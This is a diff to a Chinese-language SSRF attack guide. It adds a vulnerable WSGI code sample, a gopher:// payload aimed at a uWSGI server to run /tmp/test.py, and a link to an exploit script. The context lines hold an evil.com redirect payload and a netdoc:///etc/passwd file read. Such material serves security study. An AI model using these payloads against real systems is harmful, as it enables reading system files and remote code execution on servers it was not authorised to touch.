@@ -134,3 +134,27 @@ https://目标WEB应用程序/?q=http://evil.com/redirect.php
 ```html
 ssrf.php?url=netdoc:///etc/passwd
 ```
+
+## 利用
+
+(1)WSGI
+
+易受攻击的WSGI应用程序
+```html
+def application(environ, start_response):
+//环境变量包含SSRF攻击期间服务器传递的信息
+    url = environ.get('HTTP_X_TARGET_URL')
+    if url and url.startswith("http"):
+    //验证不足，还应该考虑其它请求协议和内部资源的访问
+        content = urlopen(url).read()
+        //如果url来自不受信任的来源，则可能出现SSRF漏洞
+```
+
+payload
+```html
+gopher://WSGI服务器地址:8000/_%00%1A%00%00%0A%00WSGI_FILE%0C%00/tmp/test.py
+```
+
+脚本
+
+[WSGI](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/SSRF/WSGI.py)
